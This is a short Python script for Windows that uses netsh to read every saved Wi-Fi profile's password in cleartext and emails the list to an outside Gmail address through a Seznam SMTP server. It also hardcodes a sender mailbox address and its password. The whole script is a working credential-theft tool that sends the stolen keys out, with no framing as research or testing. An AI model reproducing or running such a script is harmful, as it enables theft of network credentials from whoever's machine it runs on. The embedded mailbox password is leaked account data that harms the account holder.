import subprocess
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Function to extract saved Wi-Fi keys
def get_wifi_keys():
    wifi_details = []
    try:
        # Get the list of saved Wi-Fi profiles
        profiles_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding='utf-8')
        profiles = [line.split(':')[1].strip() for line in profiles_data.splitlines() if "All User Profile" in line]

        for profile in profiles:
            # Get the key content for each profile
            profile_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], encoding='utf-8')
            key_line = next((line for line in profile_info.splitlines() if "Key Content" in line), None)
            key = key_line.split(':')[1].strip() if key_line else "(No Key Found)"
            wifi_details.append((profile, key))
    except Exception as e:
        print(f"Error retrieving Wi-Fi keys: {e}")
    return wifi_details

# Function to send email
def send_email(sender_email, sender_password, recipient_email, subject, body):
    try:
        # Set up the MIME
        message = MIMEMultipart()
        message['From'] = sender_email
        message['To'] = recipient_email
        message['Subject'] = subject

        # Attach the email body
        message.attach(MIMEText(body, 'plain'))

        # Connect to Seznam SMTP server
        server = smtplib.SMTP('smtp.seznam.cz', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.send_message(message)
        server.quit()

        print("Email sent successfully!")
    except Exception as e:
        print(f"Error sending email: {e}")

# Main script
if __name__ == "__main__":
    # Replace with your email credentials
    sender_email = "info@infopeklo.cz"
    sender_password = "Polik789"
    recipient_email = "alfikeita@gmail.com"

    # Get Wi-Fi keys
    wifi_keys = get_wifi_keys()

    # Prepare email content
    subject = "Saved Wi-Fi Keys"
    body = "\n".join([f"SSID: {ssid}, Key: {key}" for ssid, key in wifi_keys])

    # Send the email
    send_email(sender_email, sender_password, recipient_email, subject, body)
